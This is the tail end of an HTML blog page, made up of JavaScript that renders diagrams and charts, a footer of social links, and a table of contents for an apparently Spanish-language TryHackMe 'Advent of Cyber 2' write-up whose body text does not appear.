      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    


    
    


    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    


    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    


    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    


    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
<div class="dropdown">
  <button class="dropdown-trigger" aria-label="Select Theme Button">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12.65 15.67c.14-.36.05-.77-.23-1.05l-2.09-2.06.03-.03c1.74-1.94 2.98-4.17 3.71-6.53h1.94c.54 0 .99-.45.99-.99v-.02c0-.54-.45-.99-.99-.99H10V3c0-.55-.45-1-1-1s-1 .45-1 1v1H1.99c-.54 0-.99.45-.99.99 0 .55.45.99.99.99h10.18C11.5 7.92 10.44 9.75 9 11.35c-.81-.89-1.49-1.86-2.06-2.88-.16-.29-.45-.47-.78-.47-.69 0-1.13.75-.79 1.35.63 1.13 1.4 2.21 2.3 3.21L3.3 16.87c-.4.39-.4 1.03 0 1.42.39.39 1.02.39 1.42 0L9 14l2.02 2.02c.51.51 1.38.32 1.63-.35zM17.5 10c-.6 0-1.14.37-1.35.94l-3.67 9.8c-.24.61.22 1.26.87 1.26.39 0 .74-.24.88-.61l.89-2.39h4.75l.9 2.39c.14.36.49.61.88.61.65 0 1.11-.65.88-1.26l-3.67-9.8c-.22-.57-.76-.94-1.36-.94zm-1.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>
  </button>
  <div class="dropdown-content">
    
    
    
      
      
        
        
          
            
              <a href="https://sckull.github.io/posts/aoc2020/" data-lang="es" class="dropdown-item is-active">Español</a>
            
          
        
      
        
      
    
  </div>
</div>

    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="https://github.com/sckull" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://steamcommunity.com/id/sckull" title="steam" aria-label="steam">
        <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="32" height="32"><path fill="currentColor" d="M 25 3 C 13.59 3 4.209375 11.680781 3.109375 22.800781 L 14.300781 28.529297 C 15.430781 27.579297 16.9 27 18.5 27 L 18.550781 27 C 18.940781 26.4 19.389375 25.649141 19.859375 24.869141 C 20.839375 23.259141 21.939531 21.439062 23.019531 20.039062 C 23.259531 15.569063 26.97 12 31.5 12 C 36.19 12 40 15.81 40 20.5 C 40 25.03 36.430937 28.740469 31.960938 28.980469 C 30.560938 30.060469 28.750859 31.160859 27.130859 32.130859 C 26.350859 32.610859 25.6 33.059219 25 33.449219 L 25 33.5 C 25 37.09 22.09 40 18.5 40 C 14.91 40 12 37.09 12 33.5 C 12 33.33 12.009531 33.17 12.019531 33 L 3.2792969 28.519531 C 4.9692969 38.999531 14.05 47 25 47 C 37.15 47 47 37.15 47 25 C 47 12.85 37.15 3 25 3 z M 31.5 14 C 27.92 14 25 16.92 25 20.5 C 25 24.08 27.92 27 31.5 27 C 35.08 27 38 24.08 38 20.5 C 38 16.92 35.08 14 31.5 14 z M 31.5 16 C 33.99 16 36 18.01 36 20.5 C 36 22.99 33.99 25 31.5 25 C 29.01 25 27 22.99 27 20.5 C 27 18.01 29.01 16 31.5 16 z M 18.5 29 C 17.71 29 16.960313 29.200312 16.320312 29.570312 L 19.640625 31.269531 C 20.870625 31.899531 21.350469 33.410625 20.730469 34.640625 C 20.280469 35.500625 19.41 36 18.5 36 C 18.11 36 17.729375 35.910469 17.359375 35.730469 L 14.029297 34.019531 C 14.289297 36.259531 16.19 38 18.5 38 C 20.99 38 23 35.99 23 33.5 C 23 31.01 20.99 29 18.5 29 z"/></svg>
      </a>
            
    
      
      <a href="https://t.me/sckull" title="telegram" aria-label="telegram">
        <svg data-name="telegram" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32"><path fill="currentColor" d="M 26.070313 3.996094 C 25.734375 4.011719 25.417969 4.109375 25.136719 4.21875 L 25.132813 4.21875 C 24.847656 4.332031 23.492188 4.902344 21.433594 5.765625 C 19.375 6.632813 16.703125 7.757813 14.050781 8.875 C 8.753906 11.105469 3.546875 13.300781 3.546875 13.300781 L 3.609375 13.277344 C 3.609375 13.277344 3.25 13.394531 2.875 13.652344 C 2.683594 13.777344 2.472656 13.949219 2.289063 14.21875 C 2.105469 14.488281 1.957031 14.902344 2.011719 15.328125 C 2.101563 16.050781 2.570313 16.484375 2.90625 16.722656 C 3.246094 16.964844 3.570313 17.078125 3.570313 17.078125 L 3.578125 17.078125 L 8.460938 18.722656 C 8.679688 19.425781 9.949219 23.597656 10.253906 24.558594 C 10.433594 25.132813 10.609375 25.492188 10.828125 25.765625 C 10.933594 25.90625 11.058594 26.023438 11.207031 26.117188 C 11.265625 26.152344 11.328125 26.179688 11.390625 26.203125 C 11.410156 26.214844 11.429688 26.21875 11.453125 26.222656 L 11.402344 26.210938 C 11.417969 26.214844 11.429688 26.226563 11.441406 26.230469 C 11.480469 26.242188 11.507813 26.246094 11.558594 26.253906 C 12.332031 26.488281 12.953125 26.007813 12.953125 26.007813 L 12.988281 25.980469 L 15.871094 23.355469 L 20.703125 27.0625 L 20.8125 27.109375 C 21.820313 27.550781 22.839844 27.304688 23.378906 26.871094 C 23.921875 26.433594 24.132813 25.875 24.132813 25.875 L 24.167969 25.785156 L 27.902344 6.65625 C 28.007813 6.183594 28.035156 5.742188 27.917969 5.3125 C 27.800781 4.882813 27.5 4.480469 27.136719 4.265625 C 26.769531 4.046875 26.40625 3.980469 26.070313 3.996094 Z M 25.96875 6.046875 C 25.964844 6.109375 25.976563 6.101563 25.949219 6.222656 L 25.949219 6.234375 L 22.25 25.164063 C 22.234375 25.191406 22.207031 25.25 22.132813 25.308594 C 22.054688 25.371094 21.992188 25.410156 21.667969 25.28125 L 15.757813 20.75 L 12.1875 24.003906 L 12.9375 19.214844 C 12.9375 19.214844 22.195313 10.585938 22.59375 10.214844 C 22.992188 9.84375 22.859375 9.765625 22.859375 9.765625 C 22.886719 9.3125 22.257813 9.632813 22.257813 9.632813 L 10.082031 17.175781 L 10.078125 17.15625 L 4.242188 15.191406 L 4.242188 15.1875 C 4.238281 15.1875 4.230469 15.183594 4.226563 15.183594 C 4.230469 15.183594 4.257813 15.171875 4.257813 15.171875 L 4.289063 15.15625 L 4.320313 15.144531 C 4.320313 15.144531 9.53125 12.949219 14.828125 10.71875 C 17.480469 9.601563 20.152344 8.476563 22.207031 7.609375 C 24.261719 6.746094 25.78125 6.113281 25.867188 6.078125 C 25.949219 6.046875 25.910156 6.046875 25.96875 6.046875 Z"/></svg>
      </a>
            
    
            
    
      
      <a href="https://twitter.com/sckull_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://sckull.github.io/posts//index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  

  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex">
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    
                        ©2021, All Rights Reserved
                    
                
            </p>
        

        
            <p class="caption">SGVsbG8gV29ybGQh</p>
            
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
    
      
        <div class="toc__flexbox--outer" data-position="fixed" data-dir="ltr" data-ani="true">
          <h6 class="toc__title toc__title--outer" data-ani="true">
            
            
              THM: Advent of Cyber 2
          </h6>
          
          <label class="switch" data-ani="true">
            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
            <span class="slider round"></span>
          </label>
          
        </div>
        <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
          <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li><a href="#informacion">Informacion</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#day-1---web-exploitation-">DAY 1 - Web Exploitation</a></li>
    <li><a href="#day-2---web-exploitation-">DAY 2 - Web Exploitation</a></li>
    <li><a href="#day-3---web-exploitation-">DAY 3 - Web Exploitation</a></li>
    <li><a href="#day-4---web-exploitation-">DAY 4 - Web Exploitation</a></li>
    <li><a href="#day-5---web-exploitation-">DAY 5 - Web Exploitation</a></li>
    <li><a href="#day-6---web-exploitation-">DAY 6 - Web Exploitation</a></li>
    <li><a href="#day-7---networking-">DAY 7 - Networking</a></li>
    <li><a href="#day-8---networking-">DAY 8 - Networking</a></li>
    <li><a href="#day-9---networking-">DAY 9 - Networking</a></li>
    <li><a href="#day-10---networking-">DAY 10 - Networking</a></li>
    <li><a href="#day-11---networking-">DAY 11 - Networking</a></li>
    <li><a href="#day-12---networking-">DAY 12 - Networking</a></li>
    <li><a href="#day-13---coal-for-christmas-">DAY 13 - Coal for Christmas</a>
      <ul>
        <li><a href="#port-scanning---nmap-">PORT SCANNING - NMAP</a></li>
        <li><a href="#initial-access---telnet-">INITIAL ACCESS - TELNET</a></li>
        <li><a href="#enumeration-">ENUMERATION</a></li>
        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
      </ul>
    </li>
    <li><a href="#day-14---wheres-rudolph-">DAY 14 - Where&rsquo;s Rudolph?</a></li>
    <li><a href="#day-15---scripting-">DAY 15 - Scripting</a></li>
    <li><a href="#day-16---scripting-">DAY 16 - Scripting</a></li>
    <li><a href="#day-17---reverse-engineering-">DAY 17 - Reverse Engineering</a></li>
    <li><a href="#day-18---reverse-engineering-">DAY 18 - Reverse Engineering</a></li>
    <li><a href="#day-19---the-naughty-or-nice-list-">DAY 19 - The Naughty or Nice List</a></li>
    <li><a href="#day-20----powershellf-to-the-rescue-">DAY 20 -  PowershELlF to the rescue</a></li>
    <li><a href="#day-21---time-for-some-elforensics-">DAY 21 - Time for some ELForensics</a></li>
    <li><a href="#day-22---elf-mceager-becomes-cyberelf-">DAY 22 - Elf McEager becomes CyberElf</a></li>
    <li><a href="#day-23---the-grinch-strikes-again-">DAY 23 - The Grinch strikes again!</a></li>
    <li><a href="#day-24---the-trial-before-christmas-">DAY 24 - The Trial Before Christmas</a></li>
  </ul>
</nav>          
        </div>
      
    
  
</div>

    </div>
</body>

</html>